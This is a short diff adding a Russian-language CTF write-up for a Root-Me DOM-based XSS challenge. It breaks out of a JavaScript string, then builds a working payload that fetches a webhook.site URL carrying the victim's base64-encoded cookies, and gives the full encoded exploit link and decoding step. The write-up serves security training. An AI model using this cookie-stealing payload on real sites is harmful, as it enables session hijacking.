@@ -1,0 +1,10 @@
+<--https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction-->
+<-!
+	1. Изначально я обратил внимание, что вводимые данные вставляются в строчку var number = '123'; (при вводе 123), тогда сразу же напрашивается полезная нагрузка
+	2. hacked'; alert(1); a='hacked
+	3. Убедившись получения уведоимления, создаем простую эксплуатацию:
+	4. hacked'; url = `https://webhook.site/3a03bfae-c84f-4579-9357-5a1b288d82f2?coook=${encodeURIComponent(btoa(document.cookie))}`; fetch(url); a='hacked
+	5. Отправляем и получаем ссылку вида:
+	http://challenge01.root-me.org/web-client/ch32/index.php?number=hacked%27%3B+url+%3D+%60https%3A%2F%2Fwebhook.site%2F3a03bfae-c84f-4579-9357-5a1b288d82f2%3Fcoook%3D%24%7BencodeURIComponent%28btoa%28document.cookie%29%29%7D%60%3B+fetch%28url%29%3B+a%3D%27hacked
+	5. Полученные данные раскодируем обратно с помощью: atob(decodeURIComponent())
+-->
